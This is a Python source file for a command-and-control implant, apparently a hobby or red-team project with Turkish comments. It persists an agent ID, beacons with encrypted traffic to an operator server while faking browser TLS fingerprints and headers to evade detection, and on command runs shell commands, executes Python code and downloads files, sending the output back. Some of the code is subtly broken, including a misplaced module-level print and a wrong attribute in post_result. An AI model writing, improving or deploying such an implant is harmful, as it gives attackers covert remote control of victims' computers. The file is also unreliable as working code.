import contextlib, io, time, random, json, uuid, datetime, subprocess, traceback, platform
from Encryption import encrypt_data, decrypt_data
from curl_cffi.requests import Session
#Configuration
SERVER = 'http://127.0.0.1:5000' # YOUR SERVER IP
BEACON_ENDPOINT = "/api/beacon"
RESULT_ENDPOINT = '/api/result'
SLEEP_MIN= 10
SLEEP_MAX= 30

BROWSER_PROFILES = [
    {"impersonate": "chrome", "family": "chrome"},
    {"impersonate": "chrome136", "family": "chrome"},  # fallback
    {"impersonate": "safari", "family": "safari"},
    {"impersonate": "safari_ios", "family": "safari_ios"},
]

import os
if platform.system() == "Windows":
    AGENT_FILE = os.path.join(os.getenv("APPDATA"), ".c2_agent_id")
else:
    AGENT_FILE = os.path.expanduser("~/.c2_agent_id")
try:
# Dosya varsa oku, yoksa yeni oluştur ve kaydet
    if os.path.exists(AGENT_FILE):
        with open(AGENT_FILE, "r", encoding="utf-8") as f:
            AGENT_ID = f.read().strip()
    else:
        AGENT_ID = str(uuid.uuid4())[:8]
        with open(AGENT_FILE, "w", encoding="utf-8") as f:
            f.write(AGENT_ID)
except Exception as e:
    AGENT_ID = str(uuid.uuid4())[:8]

print(f"Agent ID (kalıcı): {AGENT_ID}")   # ← test için, sonra silersin


def get_session():
    profile = random.choice(BROWSER_PROFILES)
    impersonate = profile["impersonate"]
    family = profile["family"]
    session = Session(
        impersonate=impersonate,
        timeout=30,
    )
    if family == "chrome":
        headers = {
            "User-Agent": session.headers.get("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"),  # curl otomatik koyar ama emin ol
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9,tr;q=0.8",
            "Sec-Ch-Ua": '"Chromium";v="136", "Not;A=Brand";v="99", "Google Chrome";v="136"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "Priority": "u=1, i",  # Chrome-like priority (2025+)
        }
    elif family in ("safari", "safari_ios"):
        headers = {
            "User-Agent": session.headers.get("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1"),
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9,tr;q=0.8",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "Priority": "u=0",  # Safari-like
        }
        if family == "safari_ios":
            headers["Sec-Ch-Ua-Platform"] = '"iOS"'
            headers["Sec-Ch-Ua-Mobile"] = "?1"
    else:
        headers = {}  # fallback

    session.headers.update(headers)
    return session

def dynamic_sleep():
    current_hour = datetime.datetime.now().hour

    if 9 <= current_hour <= 17: #Work Hours
        sleep_time =  random.randint(SLEEP_MIN, SLEEP_MAX)
    else: #Nights/Weekends
        sleep_time =  random.randint(SLEEP_MIN * 2 ,SLEEP_MAX * 3)
    jitter = sleep_time * 0.1 * (random.random() - 0.5)
    return max(0, sleep_time + jitter)

def beacon():
    max_attempts = 3
    backoff_factor = 2

    for attempt in range(1, max_attempts + 1):
        try:
            session = get_session()
            headers = {
                "Authorization": f"Bearer {AGENT_ID}",
                "X-Session": str(uuid.uuid4())  # Ekstra session tracking header
            }
            payload = {"id": AGENT_ID}
            plain_json = json.dumps(payload)
            print("[DEBUG agent] Gönderilecek plain JSON:", plain_json)

            encrypted_payload = encrypt_data(json.dumps(payload))
            print("[DEBUG agent] Şifrelenen token:", encrypted_payload[:150], "...")
            print("[DEBUG agent] Token uzunluğu:", len(encrypted_payload))

            try:
                response = session.post(f"{SERVER}{BEACON_ENDPOINT}",
                                        json = {"data": encrypted_payload},
                                        headers=headers,
                                        timeout=8
                )
                if response.status_code == 200:
                    data = response.json().get('data')
                    if data:
                        decrypted = decrypt_data(data)
                        resp = json.loads(decrypted)
                        task= resp.get('task')
                        if task:
                            execute_task(task,session)
                    return

            except Exception as e:
                print(f"[!] Beacon error: {e}")
                print("[DEBUG agent] Gönderme hatası:", str(e))
        except Exception as e:
            print(f"[!] Beacon error: (attempt {attempt}/{max_attempts}): {e}")
        if attempt < max_attempts:
            sleep_time = (backoff_factor ** (attempt - 1)) + random.uniform(0.5, 2.0)
            print(f"Waiting for retry: {sleep_time:.2f} ...")
            time.sleep(sleep_time)
    print("[!] Beacon failed after all retries")

def execute_task(task, session):
    task_type = task.get('type')

    if task_type == 'shell':
        command = task.get('command')
        run_shell_command(command,session)

    elif task_type == 'download':
        url = task.get('url')
        save_as = task.get('save_as')
        download_file(url, save_as, session)
    elif task_type == 'sleep':
        global SLEEP_MIN, SLEEP_MAX
        SLEEP_MIN = task.get("min", SLEEP_MIN)
        SLEEP_MAX = task.get("max", SLEEP_MAX)
        print(f"[*] Sleep adjusted: {SLEEP_MIN}-{SLEEP_MAX}s")
    else:
        print(f"[!] Unknown task type : {task_type}")



def download_file(url, save_as, session):
    try:
        response = session.get(url, stream=True, timeout=15)
        response.raise_for_status()
        with open(save_as, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        post_result(f"[+] Downloaded {url} as {save_as}",session)
    except Exception as e:
        post_result(f"[!] Download error : {e}",session)

def post_result(result, session):
    max_attempts = 3
    backoff_factor = 2

    if session is None:
        session = get_session()

    headers = {
        "Authorization": f"Bearer {AGENT_ID}",
        "X-Session": str(uuid.uuid4())
    }
    payload = {"id": AGENT_ID, "output": result.strip()}
    encrypted_payload = encrypt_data(json.dumps(payload))

    for attempt in range(1, max_attempts + 1):
        try:
            response = session.post(
                f"{SERVER}{RESULT_ENDPOINT}",
                json={"data": encrypted_payload},
                headers=headers, timeout=8)
            if response.status_code in (200, 201, 204):
                return
            else:
                print(f"Post result HTTP {session.status_code} (attempt {attempt})")
        except:
            pass

    if attempt < max_attempts:
        sleep_time = (backoff_factor ** (attempt - 1)) + random.uniform(0.5, 2.0)
        time.sleep(sleep_time)
print("[!] Post result failed after all retries")

def run_shell_command(command, session):
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=None
        )
        output = result.stdout
        if result.stderr:
            output = f"\n[STDERR]\n{result.stderr}"
        if not output:
            output = "[*] Command executed with no output"

        post_result(output, session)

    except subprocess.TimeoutExpired:
        post_result(f"[!] Command timed out",session)
    except Exception as e:
        post_result(f"[!] Shell execution error: {str(e)}",session)

def run_dynamic_python(code_snippet, session):
    output_buffer = io.StringIO()

    try:
        with contextlib.redirect_stdout(output_buffer), contextlib.redirect_stderr(output_buffer):
            exec(code_snippet, globals())
        result = output_buffer.getvalue()
        if not result:
            result = f"[*] Python code executed successfully (No Output)."
        post_result(result, session)
    except Exception:
        post_result(traceback.format_exc(), session)
    finally:
        output_buffer.close()

def main():
    while True:
        beacon()
        time.sleep(dynamic_sleep())

if __name__ == '__main__':
    main()
